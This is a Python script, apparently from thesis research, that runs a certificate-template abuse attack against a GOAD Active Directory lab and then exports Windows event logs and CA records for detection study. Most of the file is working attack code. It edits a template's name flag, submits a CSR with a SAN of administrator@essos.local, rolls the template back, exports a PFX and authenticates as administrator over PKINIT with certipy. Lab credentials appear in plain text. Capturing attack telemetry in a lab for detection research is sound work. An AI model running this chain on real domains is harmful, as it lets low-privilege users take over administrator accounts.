#!/usr/bin/env python3
"""
capture_trace7_split_actor_delayed_pkinit.py — Live Trace 7: Split-Actor Collusion & Delayed PKINIT
==================================================================================================
Executes Live Trace 7 against live GOAD containers (DC03 and SRV03):
1. Actor 1 (ESSOS\\khal.drogo, lowpriv) mutates CN=CGPubPositive (msPKI-Certificate-Name-Flag = 1, Event 5136).
2. Actor 2 (ESSOS\\viserys.targaryen, lowpriv) generates CSR & enrolls on CA SRV03 (Event 4886/4887).
   - Subject: CN=viserys.targaryen
   - SAN: upn=administrator@essos.local
3. Actor 1 (ESSOS\\khal.drogo) rolls back CN=CGPubPositive (msPKI-Certificate-Name-Flag = 33554432, Event 5136).
4. Delayed Authentication: Wait t_auth > t2 + 12s (strictly outside the rollback window).
5. Actor 2 (ESSOS\\viserys.targaryen) authenticates via PKINIT (Event 4768 on DC03) for administrator@essos.local.
6. Exports raw XML to thesis_research/data/live_goad_traces/trace_split_actor_delayed_pkinit.xml.
7. Updates thesis_research/data/live_goad_traces/srv03_ca_db_bridge.csv.
"""

import sys
import os
import time
import base64
import re
import pkgutil

# Compatibility patch for certipy under Python 3.14
if not hasattr(pkgutil, 'ImpImporter'):
    class ImpImporter: pass
    pkgutil.ImpImporter = ImpImporter

sys.path.append('/home/m4x1d/Desktop/GOAD/.venv/lib/python3.11/site-packages')
import winrm
from cryptography.hazmat.primitives.serialization import pkcs12, NoEncryption
from certipy.entry import main as certipy_main

OUT_DIR = "/home/m4x1d/Desktop/GOAD/thesis_research/data/live_goad_traces"
os.makedirs(OUT_DIR, exist_ok=True)

# Admin sessions for setup and event log dumping
s_dc_admin = winrm.Session('http://127.0.0.1:55985/wsman', auth=('ESSOS\\vagrant', 'vagrant'), transport='ntlm', read_timeout_sec=60, operation_timeout_sec=50)
s_srv_admin = winrm.Session('http://127.0.0.1:56985/wsman', auth=('ESSOS\\vagrant', 'vagrant'), transport='ntlm', read_timeout_sec=60, operation_timeout_sec=50)

# True low-privilege attacker sessions
s_dc_khal = winrm.Session('http://127.0.0.1:55985/wsman', auth=('khal.drogo@essos.local', 'horse'), transport='ntlm', read_timeout_sec=60, operation_timeout_sec=50)
s_dc_vis = winrm.Session('http://127.0.0.1:55985/wsman', auth=('viserys.targaryen@essos.local', 'GoldCrown'), transport='ntlm', read_timeout_sec=60, operation_timeout_sec=50)
s_srv_vis = winrm.Session('http://127.0.0.1:56985/wsman', auth=('viserys.targaryen@essos.local', 'GoldCrown'), transport='ntlm', read_timeout_sec=60, operation_timeout_sec=50)

def pull_file_winrm(session, remote_path):
    r = session.run_ps(f"[System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes('{remote_path}'))")
    return base64.b64decode(r.std_out.decode('utf-8', errors='ignore').strip())

def push_file_winrm(session, data_bytes, remote_path):
    b64 = base64.b64encode(data_bytes).decode('ascii')
    session.run_cmd(f'del /f /q "{remote_path}.b64"')
    chunk_size = 500
    for i in range(0, len(b64), chunk_size):
        chunk = b64[i:i+chunk_size]
        session.run_cmd(f'echo {chunk}>> "{remote_path}.b64"')
    session.run_cmd(f'certutil -decode "{remote_path}.b64" "{remote_path}" & del /f /q "{remote_path}.b64"')

def transfer_file_dc_to_srv(filename):
    data = pull_file_winrm(s_dc_admin, f"C:\\Shared\\{filename}")
    push_file_winrm(s_srv_admin, data, f"C:\\Shared\\{filename}")

def transfer_file_srv_to_dc(filename):
    data = pull_file_winrm(s_srv_admin, f"C:\\Shared\\{filename}")
    push_file_winrm(s_dc_admin, data, f"C:\\Shared\\{filename}")

def get_current_event_record_id(session, log_name='Security'):
    ps = f"""
    $e = Get-WinEvent -FilterHashtable @{{LogName='{log_name}'}} -MaxEvents 1 -ErrorAction SilentlyContinue
    if ($e) {{ $e.RecordId }} else {{ 0 }}
    """
    res = session.run_ps(ps)
    try:
        return int(res.std_out.decode('utf-8', errors='ignore').strip())
    except Exception:
        return 0

def export_events_since(session, start_record_id, event_ids=(5136, 4886, 4887, 4768, 4769, 4624)):
    id_list = ",".join(str(i) for i in event_ids)
    ps = f"""
    $events = Get-WinEvent -FilterHashtable @{{LogName='Security'; ID=@({id_list}); StartTime=(Get-Date).AddMinutes(-10)}} -ErrorAction SilentlyContinue | Where-Object {{ $_.RecordId -gt {start_record_id} }}
    if ($events) {{
        $xmls = foreach ($e in $events) {{ $e.ToXml() }}
        $xmls -join "`n"
    }} else {{
        ""
    }}
    """
    res = session.run_ps(ps)
    return res.std_out.decode('utf-8', errors='ignore').strip()

def main():
    print("=" * 80)
    print("LIVE TRACE 7: SPLIT-ACTOR COLLUSION & DELAYED PKINIT EXECUTION")
    print("=" * 80)

    # 1. Preparation
    s_dc_admin.run_cmd("if not exist C:\\Shared mkdir C:\\Shared")
    s_srv_admin.run_cmd("if not exist C:\\Shared mkdir C:\\Shared")

    dc_rec_start = get_current_event_record_id(s_dc_admin)
    srv_rec_start = get_current_event_record_id(s_srv_admin)
    print(f"[*] Initial Security Record IDs: DC03={dc_rec_start}, SRV03={srv_rec_start}")

    # ─────────────────────────────────────────────────────────────
    # STEP 1: Actor 1 (khal.drogo) mutates CN=CGPubPositive on DC03
    # ─────────────────────────────────────────────────────────────
    t1 = time.time()
    print(f"\n[1/5] [{time.strftime('%H:%M:%S')}] Actor 1 (ESSOS\\khal.drogo) mutates CN=CGPubPositive flag = 1 (Event 5136)...")
    res_mut = s_dc_khal.run_ps("""
    $nc = (Get-ADRootDSE).configurationNamingContext
    $p = "CN=CGPubPositive,CN=Certificate Templates,CN=Public Key Services,CN=Services,$nc"
    Set-ADObject -Identity $p -Replace @{'msPKI-Certificate-Name-Flag' = 1}
    Write-Output "MUTATED"
    """)
    print("      Result:", res_mut.std_out.decode().strip())

    # ─────────────────────────────────────────────────────────────
    # STEP 2: Actor 2 (viserys.targaryen) generates CSR on DC03 & submits to SRV03
    # ─────────────────────────────────────────────────────────────
    t_req = time.time()
    print(f"\n[2/5] [{time.strftime('%H:%M:%S')}] Actor 2 (ESSOS\\viserys.targaryen) generates CSR & submits to CA SRV03 (Events 4886/4887)...")
    inf_t7 = """
$inf = @"
[NewRequest]
Subject = "CN=viserys.targaryen"
KeyLength = 2048
Exportable = TRUE
MachineKeySet = FALSE
[Extensions]
2.5.29.17 = "{text}upn=administrator@essos.local"
[RequestAttributes]
CertificateTemplate = "CGPubPositive"
"@
[System.IO.File]::WriteAllText("C:\\Shared\\t7_split.inf", $inf)
$p = Start-Process -FilePath "certreq.exe" -ArgumentList "-new -q -f C:\\Shared\\t7_split.inf C:\\Shared\\t7_split.req" -Wait -PassThru -NoNewWindow
Write-Output ("CSR ExitCode: " + $p.ExitCode)
"""
    res_inf = s_dc_vis.run_ps(inf_t7)
    print("      CSR creation on DC03:", res_inf.std_out.decode().strip())
    transfer_file_dc_to_srv("t7_split.req")

    sub_t7 = """
$p = Start-Process -FilePath "certreq.exe" -ArgumentList "-submit -q -f -config `"braavos.essos.local\\CertGraph-Lab-CA`" C:\\Shared\\t7_split.req C:\\Shared\\t7_split.cer" -Wait -PassThru -NoNewWindow
Write-Output ("Submit ExitCode: " + $p.ExitCode)
"""
    res_sub = s_srv_vis.run_ps(sub_t7)
    print("      CA Submission on SRV03:", res_sub.std_out.decode().strip())
    transfer_file_srv_to_dc("t7_split.cer")

    # ─────────────────────────────────────────────────────────────
    # STEP 3: Actor 1 (khal.drogo) rolls back CN=CGPubPositive on DC03
    # ─────────────────────────────────────────────────────────────
    t2 = time.time()
    print(f"\n[3/5] [{time.strftime('%H:%M:%S')}] Actor 1 (ESSOS\\khal.drogo) rolls back CN=CGPubPositive flag = 33554432 (Event 5136)...")
    res_rb = s_dc_khal.run_ps("""
    $nc = (Get-ADRootDSE).configurationNamingContext
    $p = "CN=CGPubPositive,CN=Certificate Templates,CN=Public Key Services,CN=Services,$nc"
    Set-ADObject -Identity $p -Replace @{'msPKI-Certificate-Name-Flag' = 33554432}
    Write-Output "ROLLED_BACK"
    """)
    print("      Result:", res_rb.std_out.decode().strip())

    # ─────────────────────────────────────────────────────────────
    # STEP 4: DELAYED WINDOW (t_auth > t2 + 12s, outside mutation window)
    # ─────────────────────────────────────────────────────────────
    delay_sec = 14.0
    print(f"\n[4/5] [{time.strftime('%H:%M:%S')}] Enforcing Time-Delay Window: Waiting {delay_sec}s for rollback window to close...")
    time.sleep(delay_sec)

    # ─────────────────────────────────────────────────────────────
    # STEP 5: Actor 2 (viserys.targaryen) exports PFX & authenticates via PKINIT on DC03
    # ─────────────────────────────────────────────────────────────
    t_auth = time.time()
    print(f"\n[5/5] [{time.strftime('%H:%M:%S')}] Actor 2 (viserys.targaryen) authenticates via PKINIT on DC03 (Event 4768) at delta = {t_auth - t2:.2f}s post-rollback...")

    pfx_ps = """
    $p = Start-Process -FilePath "certreq.exe" -ArgumentList "-accept -user -q C:\\Shared\\t7_split.cer" -Wait -PassThru -NoNewWindow
    $sn_raw = (certutil -dump "C:\\Shared\\t7_split.cer" | Select-String "Serial Number:").ToString().Split(":")[-1].Trim()
    $cert = Get-ChildItem Cert:\\CurrentUser\\My | Where-Object { $_.SerialNumber -eq $sn_raw -or ($_.SerialNumber -replace " ") -eq ($sn_raw -replace " ") } | Select-Object -First 1
    if (-not $cert) {
        $cert = Get-ChildItem Cert:\\CurrentUser\\My | Where-Object { $_.HasPrivateKey } | Sort-Object NotBefore -Descending | Select-Object -First 1
    }
    $pwd = ConvertTo-SecureString -String "Password123!" -Force -AsPlainText
    Export-PfxCertificate -Cert $cert -FilePath "C:\\Shared\\t7_split.pfx" -Password $pwd | Out-Null
    Write-Output "PFX_EXPORTED"
    """
    res_pfx = s_dc_vis.run_ps(pfx_ps)
    print("      Cert accept & PFX export:", res_pfx.std_out.decode().strip())

    pfx_raw = pull_file_winrm(s_dc_admin, "C:\\Shared\\t7_split.pfx")
    key, cert_obj, add_certs = pkcs12.load_key_and_certificates(pfx_raw, b"Password123!")
    unprotected = pkcs12.serialize_key_and_certificates(name=b"auth", key=key, cert=cert_obj, cas=add_certs, encryption_algorithm=NoEncryption())
    local_pfx = "/tmp/t7_split.pfx"
    with open(local_pfx, "wb") as f:
        f.write(unprotected)

    # Run certipy PKINIT auth targeting DC03
    print("      Executing Kerberos PKINIT auth against DC03 (172.18.0.2:88)...")
    sys.argv = ["certipy", "auth", "-pfx", local_pfx, "-dc-ip", "172.18.0.2", "-no-hash"]
    try:
        certipy_main()
    except Exception as e:
        print("      Certipy PKINIT output:", e)

    time.sleep(3)

    # ─────────────────────────────────────────────────────────────
    # STEP 6: Export Telemetry & Combined XML
    # ─────────────────────────────────────────────────────────────
    print("\n[*] Exporting Windows Security event telemetry from DC03 and SRV03...")
    dc_xml = export_events_since(s_dc_admin, dc_rec_start, (5136, 4768, 4624))
    srv_xml = export_events_since(s_srv_admin, srv_rec_start, (4886, 4887))

    xml_path = os.path.join(OUT_DIR, "trace_split_actor_delayed_pkinit.xml")
    combined_events = []
    if dc_xml:
        combined_events.extend(re.findall(r'<Event[\s\S]*?</Event>', dc_xml))
    if srv_xml:
        combined_events.extend(re.findall(r'<Event[\s\S]*?</Event>', srv_xml))

    def extract_time(chunk):
        m = re.search(r"SystemTime='([^']+)'", chunk)
        return m.group(1) if m else ""

    combined_events.sort(key=extract_time)

    with open(xml_path, "w", encoding="utf-8") as f:
        f.write('<?xml version="1.0" encoding="utf-8"?>\n<Events>\n')
        for ev in combined_events:
            f.write(ev + "\n")
        f.write('</Events>\n')

    print(f"[+] Successfully exported {len(combined_events)} live events to: {xml_path}")

    # ─────────────────────────────────────────────────────────────
    # STEP 7: Update srv03_ca_db_bridge.csv
    # ─────────────────────────────────────────────────────────────
    print("[*] Updating CA DB cryptographic bridge from SRV03...")
    ps_bridge = """
    certutil -view -out RequestId,RequesterName,SerialNumber,CertificateHash,SubjectKeyIdentifier,CertificateTemplate,UPN,CommonName,NotBefore,NotAfter csv
    """
    res_b = s_srv_admin.run_ps(ps_bridge)
    raw_csv = res_b.std_out.decode('utf-8', errors='ignore')

    bridge_path = os.path.join(OUT_DIR, "srv03_ca_db_bridge.csv")
    csv_lines = [l.strip() for l in raw_csv.splitlines() if l.strip() and not l.startswith("---") and not l.startswith("Maximum") and not l.startswith("CertUtil:")]
    if csv_lines:
        with open(bridge_path, "w", encoding="utf-8") as f:
            f.write("\n".join(csv_lines) + "\n")
        print(f"[+] Successfully updated CA DB bridge ({len(csv_lines)} records) at: {bridge_path}")

    print("\n" + "=" * 80)
    print("LIVE TRACE 7 CAPTURE COMPLETE!")
    print(f"  - Mutation Actor 1:  ESSOS\\khal.drogo (t1 = {t1:.1f})")
    print(f"  - Enroller Actor 2:  ESSOS\\viserys.targaryen (t_req = {t_req:.1f})")
    print(f"  - Rollback Actor 1:  ESSOS\\khal.drogo (t2 = {t2:.1f})")
    print(f"  - Delayed Auth:      administrator@essos.local (t_auth = {t_auth:.1f}, delta = {t_auth - t2:.2f}s post-rollback)")
    print(f"  - Total Events:      {len(combined_events)} raw XML events saved")
    print("=" * 80)

if __name__ == "__main__":
    main()
